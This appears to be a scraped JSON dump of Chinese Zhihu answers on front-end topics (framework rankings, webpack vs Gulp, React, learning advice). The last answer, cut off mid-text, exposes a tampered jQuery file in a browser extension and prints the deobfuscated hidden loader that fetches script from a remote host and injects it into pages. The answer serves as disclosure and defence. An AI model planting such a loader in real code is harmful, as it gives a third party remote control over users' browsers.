class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;14.&lt;/b&gt;&lt;b&gt;名称：MUI&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言： HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：Dclould&lt;/p&gt;&lt;p&gt;最后更新时间：2016年1月&lt;/p&gt;&lt;p&gt;人气：在Github上有2012 stars&lt;/p&gt;&lt;p&gt;描述：MUI-最接近原生App体验的前端框架框架。&lt;/p&gt;&lt;p&gt;核心概念/原则: 多端发布、高性能&lt;/p&gt;&lt;p&gt;响应式: NO&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//dev.dcloud.net.cn/mui/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;MUI-最接近原生APP体验的高性能前端框架&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/dcloudio/mui&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;dcloudio/mui · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;15.&lt;/b&gt;&lt;b&gt;名称：Arale&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言： JavaScript&lt;/p&gt;&lt;p&gt;创建者：支付宝前端&lt;/p&gt;&lt;p&gt;最后更新时间：2015年7月&lt;/p&gt;&lt;p&gt;人气：在Github上有1252 stars&lt;/p&gt;&lt;p&gt;描述：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//aralejs.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Arale&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt; 是一个开放、简单、易用的前端基础类库。&lt;/p&gt;&lt;p&gt;框架大小:未知&lt;/p&gt;&lt;p&gt;核心概念/原则: 开放、简单、易用&lt;/p&gt;&lt;p&gt;浏览器支持：Firefox, Chrome, Safari, IE6+&lt;/p&gt;&lt;p&gt;响应式: Yes&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//aralejs.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Arale - 随心构建互联网应用&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/aralejs/aralejs.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;aralejs/aralejs.org · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;16.&lt;/b&gt;&lt;b&gt;名称：JX&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：Javascript&lt;/p&gt;&lt;p&gt;创建者：腾讯前端&lt;/p&gt;&lt;p&gt;最后更新时间：2015年12月&lt;/p&gt;&lt;p&gt;人气：在Github上有952 stars&lt;/p&gt;&lt;p&gt;描述：JX 是模块化的非侵入式Web前端框架，特别适合构建和组织大规模、工业级的Web App。&lt;/p&gt;&lt;p&gt;框架大小: 未知&lt;/p&gt;&lt;p&gt;核心概念/原则: 保持最优执行效率&lt;/p&gt;&lt;p&gt;浏览器支持：\n兼容主流浏览器&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//alloyteam.github.io/JX/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;JX - 腾讯 Web 前端开发框架&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/AlloyTeam/JX&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;AlloyTeam/JX · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;17.&lt;/b&gt;&lt;b&gt;名称：GMU&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：百度前端&lt;/p&gt;&lt;p&gt;最后更新时间：2015年12月&lt;/p&gt;&lt;p&gt;人气：在Github上有940stars&lt;/p&gt;&lt;p&gt;描述：GMU是基于zepto的mobile UI组件库，提供webapp、pad端简单易用的UI组件! Web App。&lt;/p&gt;&lt;p&gt;核心概念/原则: 简单易用、轻量级&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//gmu.baidu.com/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;gmu.baidu.com/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/fex-team/GMU&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;fex-team/GMU · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;18.&lt;/b&gt;&lt;b&gt;名称：ZUI&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言： HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：蝉道&lt;/p&gt;&lt;p&gt;最后更新时间：2015年7月&lt;/p&gt;&lt;p&gt;人气：在Github上有616 stars&lt;/p&gt;&lt;p&gt;描述：开源HTML5前端框架&lt;/p&gt;&lt;p&gt;核心概念/原则:简单易用、轻量级、易于定制&lt;/p&gt;&lt;p&gt;浏览器支持：未知&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//zui.sexy/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;ZUI - 开源HTML5跨屏框架&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/easysoft/zui&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;easysoft/zui · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;19.&lt;/b&gt;&lt;b&gt;名称：Clouda Touch.js&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：JavaScript&lt;/p&gt;&lt;p&gt;创建者：百度云&lt;/p&gt;&lt;p&gt;人气：在Github上有387 stars&lt;/p&gt;&lt;p&gt;描述：Touch.js是移动设备上的手势识别与事件库,也是在百度内部广泛使用的开发。&lt;/p&gt;&lt;p&gt;核心概念/原则: 无入侵设计、媲美原生的交互、极简的API&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//touch.code.baidu.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Touch.js&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/Clouda-team/touch.code.baidu.com&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Clouda-team/touch.code.baidu.com · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;20.&lt;/b&gt;&lt;b&gt;名称：Arkui&lt;/b&gt;&lt;/p&gt;&lt;p&gt;类别/语言：HTML、CSS、JavaScript&lt;/p&gt;&lt;p&gt;创建者：豆瓣&lt;/p&gt;&lt;p&gt;人气：在Github上有129 stars&lt;/p&gt;&lt;p&gt;模块化: Yes&lt;/p&gt;&lt;p&gt;官网地址：&lt;a href=&quot;//link.zhihu.com/?target=http%3A//mockee.com/arkui/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;arkui&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Github地址：&lt;a href=&quot;//link.zhihu.com/?target=https%3A//github.com/mockee/arkui&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;mockee/arkui · GitHub&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n<b>2015</b><b>年已经过去了，作为一个前端开发者，我觉得有必要把过去一年帮助过我或朋友们的优秀开源前端框架做个盘点，希望这些项目能够越来越好，帮助到更多的前端开发者们。</b><b>此榜单根据github</b><b>上star</b><b>数作为排名依据，一个人力量有限，如果收集有遗漏欢迎补充。</b><b>1</b><b>、…</b>\n\n<a href=\"/question/39377015/answer/81017680\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2016-01-11\" target=\"_blank\" href=\"/question/39377015/answer/81017680\">编辑于 2016-01-11</a></p>\n\n",
    "link": "https://zhihu.com/question/39377015/answer/81017680"
  },
  {
    "question": "\nWebpack、Browserify和Gulp三者之间到底是怎样的关系？\n",
    "author": "一波不是一波",
    "content": "\n\n<textarea hidden class=\"content\">怎么解释呢？因为 Gulp 和 browserify / webpack 不是一回事&lt;br&gt;&lt;br&gt;Gulp应该和Grunt比较，他们的区别我就不说了，说说用处吧。Gulp / Grunt 是一种工具，能够优化前端工作流程。比如自动刷新页面、combo、压缩css、js、编译less等等。简单来说，就是使用Gulp/Grunt，然后配置你需要的插件，就可以把以前需要手工做的事情让它帮你做了。&lt;br&gt;&lt;br&gt;说到 browserify / webpack ，那还要说到 seajs / requirejs 。这四个都是JS模块化的方案。其中seajs / require 是一种类型，browserify / webpack 是另一种类型。&lt;br&gt;&lt;br&gt;&lt;ul&gt;&lt;li&gt;seajs / require : 是一种在线&quot;编译&quot; 模块的方案，相当于在页面上加载一个 CMD/AMD 解释器。这样浏览器就认识了 define、exports、module 这些东西。也就实现了模块化。&lt;br&gt;&lt;/li&gt;&lt;li&gt;browserify / webpack : 是一个预编译模块的方案，相比于上面 ，这个方案更加智能。没用过browserify，这里以webpack为例。首先，它是预编译的，不需要在浏览器中加载解释器。另外，你在本地直接写JS，不管是 AMD / CMD / ES6 风格的模块化，它都能认识，并且编译成浏览器认识的JS。&lt;/li&gt;&lt;/ul&gt;这样就知道，Gulp是一个工具，而webpack等等是模块化方案。Gulp也可以配置seajs、requirejs甚至webpack的插件。&lt;br&gt;&lt;br&gt;不知道这样够清楚了么</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n怎么解释呢？因为 Gulp 和 browserify / webpack 不是一回事 Gulp应该和Grunt比较，他们的区别我就不说了，说说用处吧。Gulp / Grunt 是一种工具，能够优化前端工作流程。比如自动刷新页面、combo、压缩css、js、编译less等等。简单来说，就是使用Gulp/Grun…\n\n<a href=\"/question/37020798/answer/71621266\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2015-11-10\" target=\"_blank\" href=\"/question/37020798/answer/71621266\">编辑于 2015-11-10</a></p>\n\n",
    "link": "https://zhihu.com/question/37020798/answer/71621266"
  },
  {
    "question": "\n计划创建一个网站，已掌握前台知识，但不会后台技术，它们之间什么样的技术关系？\n",
    "author": "冯一晨",
    "content": "\n\n<textarea hidden class=\"content\">想起某家政府网站，一个提交咨询和反馈的页面，一提交异常快地弹个alert提交成功，一看源码，尼玛连submit都没有，压根就一alert。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n想起某家政府网站，一个提交咨询和反馈的页面，一提交异常快地弹个alert提交成功，一看源码，尼玛连submit都没有，压根就一alert。\n\n<a href=\"/question/21287105/answer/17768836\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" target=\"_blank\" href=\"/question/21287105/answer/17768836\">发布于 2013-07-03</a></p>\n\n",
    "link": "https://zhihu.com/question/21287105/answer/17768836"
  },
  {
    "question": "\n我们为什么需要React?\n",
    "author": "yjcxy12",
    "content": "\n\n<textarea hidden class=\"content\">国外现在是React一统世界，不知道知乎上为什么唱衰的比较多。React已经大量得被各个公司各种产品使用，也就是说React已经不是未来的技术，使用React也不能说很潮了。&lt;br&gt;&lt;br&gt;关于React的好处，和Angular的比较之类的文章有非常多，大部分是一两年前写出来的，现在的文章基本上是React最佳实践是什么，React怎么上手之类。可以看出React到底需不需要，到底好不好，和Angular比较起来如何等等都已经算是有定论了。你不用该不用，但是从React社区出来的对前端巨大的影响是没法忽视的，React就像是房间里的大象(Elephant in the room)，你不得不面对它，了解它，深入了解过后还选择别的框架是你的选择，不过不了解React及其生态的核心概念(组件化，虚拟DOM，单向数据流，附带es6，webpack等等)会让你觉得你已经out了。&lt;br&gt;&lt;br&gt;至于我个人使用的 经验，刚开始用的时候的确是有很多字疑问的，用Angular我会更快做出来的东西，我为什么要用React。用久了就能感觉Angular很清晰的劣势&lt;br&gt;- Angular的Depency Injection很丑，为了minify还要用array写两遍变量名&lt;br&gt;- Angular的module和es6  module兼容性很不好&lt;br&gt;- Scope chain只能让人越用越糊涂。Controller as也没改善太多&lt;br&gt;- Provider, Factory, Service其实是一样的东西&lt;br&gt;- 目前的最佳实践是页面上所有东西都用Directive,强制组件化(那为啥不直接用React?)&lt;br&gt;- 侵入性太强，需要学很多Angular特有的语法，track by, transclude, $开头的所有变量，scope, promise. http 都必须使用它提供的&lt;br&gt;&lt;br&gt;而React的优势，今年React Europe上Cheng Lou的演讲就很好的说出来: Html完全不能满足我们对于前端app的需求，所以React给了我们全部javascript没有html的方案，这给了我们可以使用完备的程序语言来构建页面的能力，同时对于优化则是做到最底层minimum DOM diff。&lt;br&gt;&lt;br&gt;我觉得程序员需要有一种对一段代码是否是正统的直觉，比如使用setTimeout(fn, 0)来跳出当前执行感觉是Hacky而不正统，比如arr.constructor === Array 就觉得没有 Array.isArray()正统。而使用过这么久React的个人感觉，React中大部分概念是正统的，是rightful的，远比Angular要多。&lt;br&gt;&lt;br&gt;最后还是再强调一下React是当下前端是绕不过去的坎，已经不是不妨了解一下的程度，而是不了解要out了。当你深入了解了React，再挑React的毛病，会让你可信很多(就像Cycle.js作者一样)&lt;br&gt;&lt;br&gt;EDIT:&lt;br&gt;问题更新了，那就更新一下关于React本身和生态吧。&lt;br&gt;&lt;br&gt;React从发布起几年来有过几次变革，基本上React发展的时间和这几年前端工程化迅猛发展有很高的重合。记得当时是用React.creatClass定义组件，还是用着es5，用着mixin。而es6的发展红红火火，万众所归，React也适时得推出es6 class syntax。之后redux带着函数式的概念一统各类flux，顺带函数式呼声越来越高，React也推出了functional stateless component。&lt;br&gt;&lt;br&gt;Build tool方面，记得当初还是grunt的天下，接着gulp取代其位置，和babel browserify一起接管React项目中各种任务(transpile js/css, uglify, sourcemap, concat等等)，之后是React和Redux各大神看中webpack能打包多个文件和hot module reloading的特性全部转入webpack，webpack也的确给力，打包起来比gulp方便，debug又有webpack-dev-server这个大杀器。&lt;br&gt;&lt;br&gt;一开始React就是宣传两个概念，组件化和virtual dom，这些基本都被说烂了，而个人看法除了这两点，React最大的贡献一是一直帮助整个前端进入工程化，标准化的时代(使用virtual dom和jsx转换的library是可以替换React的)，二是将函数式思想介绍给前端。functional stateless component就是 view=f(state)而redux核心也就是nextState=f(state, action)，也催生了很多函数式的最佳实践，比如action creator和reducer必须是没有副作用的pure function，比如使用immutable操作(concat,map替代push,forEach)。&lt;br&gt;&lt;br&gt;要说现在用React做网站设置繁琐吗？当然繁琐，要设置eslint，babel，webpack，用boilerplate最终还是要了解各个不同的东西是干嘛的，不过把这些归罪React也不是太恰当，毕竟是整个前端生态圈都进化了。用Angular 2或者Ember你还是得用到这些。React的繁琐基本都在redux上，得creatStore还得加入middleware还得用connect()连接到store，而带来的高阶组建的概念不好懂也不容易用。&lt;br&gt;&lt;br&gt;React有它自己的缺点，毕竟我们上哪找完美的东西呢？Boilerplate过多，setState是异步的，context api很坑爹，server side reder各种坑(设置hmr，哪些call在服务器做，哪些只能在浏览器运行等等)，animation到现在都没什么太好的方案。&lt;br&gt;&lt;br&gt;不过React值得用吗？当然值得，它给你组件化页面，入门函数式，清晰的单向数据流(dispatch(action)-&amp;gt;reducer-&amp;gt;render)，深入了还有高阶组件的composability，能发现selector和reducer其实也是composable的，顺带着各个工具的使用(eslint, babel, webpack)，不小心还能入Elm和Clojurescript的坑。&lt;br&gt;&lt;br&gt;还有一个经常被提起的好处是React redux做的网站，重构非常方便，在需求永远不固定的世界里也是一大优势。&lt;br&gt;&lt;br&gt;所以，这么多大公司转用React也许不是因为他们都是傻子，也许React确确实实带来了好处。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n国外现在是React一统世界，不知道知乎上为什么唱衰的比较多。React已经大量得被各个公司各种产品使用，也就是说React已经不是未来的技术，使用React也不能说很潮了。 关于React的好处，和Angular的比较之类的文章有非常多，大部分是一两年前写出来的，现在…\n\n<a href=\"/question/47161776/answer/110719969\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2016-07-12\" target=\"_blank\" href=\"/question/47161776/answer/110719969\">编辑于 2016-07-15</a></p>\n\n",
    "link": "https://zhihu.com/question/47161776/answer/110719969"
  },
  {
    "question": "\n如何看待 Reaktor Hello World 卫星将搭载 node.js 程序?\n",
    "author": "vczh",
    "content": "\n\n<textarea hidden class=\"content\">“要是node.js都能用，那别的肯定也没问题了”</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n“要是node.js都能用，那别的肯定也没问题了”\n\n<a href=\"/question/46100153/answer/100252779\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" target=\"_blank\" href=\"/question/46100153/answer/100252779\">发布于 2016-05-11</a></p>\n\n",
    "link": "https://zhihu.com/question/46100153/answer/100252779"
  },
  {
    "question": "\n怎么看待朴灵评注阮一峰老师的最新文章这件事？\n",
    "author": "萧井陌",
    "content": "\n\n<textarea hidden class=\"content\">谈程序，他肯定是不专业的，不过据说中文版黑客与画家翻译得挺好，这不是很好吗，每个人都有自己的位置。&lt;br&gt;&lt;br&gt;其实他也不是恶意，而是他就懂这么多，然后把自己懂的东西说出来了，其中会有很多错误、疏漏，这都很正常，本来就只是立足业余玩家，你认真那是你错了。&lt;br&gt;&lt;br&gt;我觉得立志当一名牛逼程序员的人即使在很短的短期内被他的博文误导，应该也会很快跳坑出来。&lt;br&gt;而看得津津有味的业余选手，本来也就无伤大雅了。&lt;br&gt;&lt;br&gt;如果你是程序员，那最好不要看他的技术文章。&lt;br&gt;事实上，程序员不应该通过博客来学习，基础就那 几本书，学完就不会被这些n手资料迷惑了。&lt;br&gt;&lt;br&gt;&lt;br&gt;所以我觉得批注的话，言辞最好不要那么激烈，大家互相交流切磋，也是一件好事，打来打去没什么意思，因为总有你不懂的东西。只要不是心怀叵测的人，没必要言语过于刻薄。&lt;br&gt;&lt;br&gt;&lt;br&gt;至于runloop什么的，写过GUI库的人应该都会有深刻的理解。</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n\n谈程序，他肯定是不专业的，不过据说中文版黑客与画家翻译得挺好，这不是很好吗，每个人都有自己的位置。 其实他也不是恶意，而是他就懂这么多，然后把自己懂的东西说出来了，其中会有很多错误、疏漏，这都很正常，本来就只是立足业余玩家，你认真那是你错…\n\n<a href=\"/question/26038323/answer/31896939\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" target=\"_blank\" href=\"/question/26038323/answer/31896939\">发布于 2014-10-15</a></p>\n\n",
    "link": "https://zhihu.com/question/26038323/answer/31896939"
  },
  {
    "question": "\n各位师兄师姐好，自学Web前端可以给点建议吗？\n",
    "author": "Jim Jin",
    "content": "\n\n<textarea hidden class=\"content\">建议学习流程：&lt;br&gt;&lt;br&gt;&lt;b&gt;第一步：&lt;/b&gt;先花上一个月的时间把w3cschool上HTML/CSS和Javascript模块的教程学完。&lt;br&gt;    学习方法：&lt;br&gt;    1）把HTML/CSS和Javascript模块里面的知识点分拆到每一天，每天只需要完成这么多，坚持下去。&lt;br&gt;    2）每个知识点完成以后，网站上有个测试的功能，测试一下自己学习的怎么样了。&lt;br&gt;    3）先不用着急进行网站页面的设计和开发，先找找哪些网页用到了这个东西，看看人家前端代码怎么写的。&lt;br&gt;&lt;b&gt;第二步：&lt;/b&gt;再花上一个月的时间做几个不同风格布局的仿站练练手，找最简单的开始，先把网站分解，分配到每天几个页面去做，不会的话就参考他们的网页源代码，图片也用他们现成的。&lt;br&gt;&lt;b&gt;第三部：&lt;/b&gt;从网上找psd格式的网页设计搞，根据网上的教程学学如何切图，然后根据网页设计稿完成Web界面开发。&lt;br&gt;&lt;br&gt;&lt;b&gt;完成上面的步骤，你基本上就可以算是菜鸟网页开发了。下面开始向前端进发：&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;第四步：学习&lt;/b&gt;Jquery&lt;b&gt;、&lt;/b&gt;AngularJS、React、Bootstrap等前端框架，这个可以按照文档、DEMO、练习、仿站的步骤去学。PC端和移动端都做几个仿站。这个步骤算是攻坚阶段，做仿站的时候最好挑一些简单但是完整的应用去仿。一个框架根据情况需要一两个月学习和实践。&lt;br&gt;&lt;br&gt;&lt;b&gt;完成这一步你应该就算是菜鸟前端了&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;第五步：&lt;/b&gt;如果觉得自己可以上手了，去找些接私活的网站试试接点私活吧，从最简单的开始，可以在上面找一个美工合作，你会遇到非常多的问题，这些问题就是你工作以后会遇到的问题，耐心的分析和解决每一个问题，会给你进入职场提供很大的帮助。&lt;br&gt;&lt;br&gt;如果你都按照上面的做了，毕业找工作时候拜托给我发个简历，现在招前端太难了。&lt;br&gt;&lt;br&gt;更一下：&lt;br&gt;1. 这个建议不一定适合所有人，因为每个人对“学完”这两个字理解不一样，这里指的肯定不是看过一遍，而是学而能用&lt;br&gt;2.来了好多私信求职求实习，不过我这个真不是招聘帖，我不保证一定有open的岗位，不过如果你按照上面的做了，拿着自己的作品去面试，一般是要抢的。&lt;br&gt;&lt;img src=&quot;https://pic3.zhimg.com/db1865fa85f5732a3ec57fa578f220f6_b.png&quot; data-rawwidth=&quot;360&quot; data-rawheight=&quot;470&quot; class=&quot;content_image&quot; width=&quot;360&quot;&gt;</textarea>\n\n\n<div class=\"zh-summary summary clearfix\">\n<img src=\"https://pic3.zhimg.com/db1865fa85f5732a3ec57fa578f220f6_200x112.png\" data-rawwidth=\"360\" data-rawheight=\"470\" class=\"origin_image inline-img zh-lightbox-thumb\" data-original=\"https://pic3.zhimg.com/db1865fa85f5732a3ec57fa578f220f6_r.png\">\n建议学习流程： <b>第一步：</b>先花上一个月的时间把w3cschool上HTML/CSS和Javascript模块的教程学完。 学习方法： 1）把HTML/CSS和Javascript模块里面的知识点分拆到每一天，每天只需要完成这么多，坚持下去。 2）每个知识点完成以后，网站上有个测试的功能，测…\n\n<a href=\"/question/48517032/answer/111275552\" class=\"toggle-expand\">显示全部</a>\n\n</div>\n\n\n\n<p class=\"visible-expanded\"><a itemprop=\"url\" class=\"answer-date-link meta-item\" data-tooltip=\"s$t$发布于 2016-07-15\" target=\"_blank\" href=\"/question/48517032/answer/111275552\">编辑于 2016-07-18</a></p>\n\n",
    "link": "https://zhihu.com/question/48517032/answer/111275552"
  },
  {
    "question": "\nChrome、360极速浏览器下有一个叫sorry youku的广告屏蔽插件.我发现它会自动向 urllog.sinaapp.com 发送xhr. 它是不是在采集用户隐私?\n",
    "author": "Chaos",
    "content": "\n\n<textarea hidden class=\"content\">楼主你观察的很仔细，判断也非常准确&lt;br&gt;这个插件里面的jquery.min确实做过手脚，原版的 jquery.1.7.2.min 是 93K，而这个版本是 123K&lt;br&gt;它与原版的区别在于最后多了一段 eval(function(){...}(...)) ，而且用了一些技巧来隐藏代码&lt;br&gt;手段真是太卑劣了！&lt;br&gt;&lt;br&gt;====解决办法补充====&lt;br&gt;&lt;br&gt;如果你又想用这个插件，又不想被流氓，那么可以这样做：&lt;br&gt;下载&lt;a href=&quot;//link.zhihu.com/?target=http%3A//code.jquery.com/jquery-1.7.2.min.js&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;code.jquery.com/jquery-&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;1.7.2.min.js&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;br&gt;然后将文件改名为 jquery.min.js 覆盖插件目录下的同名文件&lt;br&gt;插件目录在&lt;br&gt;C:\\Documents and Settings\\{你的用户名}\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Extensions\\dcncfdhemhdieidebiclbhhlkhecdjmd\\2.3_0&lt;br&gt;&lt;br&gt;可能最后的 dcncfdhemhdieidebiclbhhlkhecdjmd\\2.3_0 会因为插件版本不同而有所变动&lt;br&gt;&lt;br&gt;====代码补充=====&lt;br&gt;跟踪了一下代码，最后多出那段代码，解析后如下&lt;br&gt;&lt;br&gt;var forfun = function() {&lt;br&gt;    var h = document.documentElement;&lt;br&gt;    var v = h.getAttribute(&quot;version&quot;);&lt;br&gt;    var c = 'g42dymwpi--nx';&lt;br&gt;    if (v !== c) {&lt;br&gt;        h.setAttribute('version', c);&lt;br&gt;        var b = new XMLHttpRequest();&lt;br&gt;        var u = &quot;moc.ppaanis.gollru//:sptth&quot;.split(&quot;&quot;).reverse().join(&quot;&quot;);&lt;br&gt;        b.open(&quot;GET&quot;, u, true);&lt;br&gt;        b.onreadystatechange = function() {&lt;br&gt;            if (b.readyState == 4 &amp;amp;&amp;amp; b.status == 200) {&lt;br&gt;                var a = b.responseText;&lt;br&gt;                if (a !== &quot;&quot;) {&lt;br&gt;                    var t = document.body;&lt;br&gt;                    var s = document.createElement('script');&lt;br&gt;                    s.type = 'text/javascript';&lt;br&gt;                    s.innerHTML = a;&lt;br&gt;                    t.insertBefore(s, t.lastChild)&lt;br&gt;                }&lt;br&gt;            }&lt;br&gt;        };&lt;br&gt;        b.setRequestHeader(&quot;Check-Update&quot;, &quot;True&quot;);&lt;br&gt;        b.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);&lt;br&gt;        b.send()&lt;br&gt;    }&lt;br&gt;};&lt;br&gt;forfun();&lt;br&gt;&lt;br&gt;也就是说，他会发起ajax请求到&lt;a href=&quot;//link.zhihu.com/?target=https%3A//urllog.sinaapp.com/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;urllog.sinaapp.com/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt;，然后将请求返回的结果作为 script 插入到DOM里面，这样这个插件其实具备了传说中的“云控制”功能，也就是插件作者只需要更新一下&lt;a href=&quot;//link.zhihu.com/?target=https%3A//urllog.sinaapp.com/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;urllog.sinaapp.com/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;i class=&quot;icon-external&quot;&gt;&lt;/i&gt;&lt;/a&gt; 